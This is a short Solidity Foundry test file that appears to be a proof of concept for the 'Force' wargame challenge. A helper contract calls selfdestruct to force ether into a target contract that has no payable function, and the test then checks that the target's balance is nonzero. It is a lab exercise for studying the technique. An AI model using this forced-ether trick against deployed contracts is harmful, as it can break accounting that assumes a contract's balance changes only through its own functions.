// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {Force} from "../src/Force.sol";

contract Eth_transfer{
    function _transfer(address to) public payable {
        selfdestruct(payable(to));
    }
}

contract Force_POC is Test {
    Force _force;
    Eth_transfer _eth_transfer;
    function init() private{
        vm.startPrank(address(0x1));
        _force = new Force();
        _eth_transfer = new Eth_transfer();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_Force_POC() public{
        _eth_transfer._transfer{value: 1}(address(_force));
        bool success = address(_force).balance > 0;
        console.log("Success:",success);
    }
}

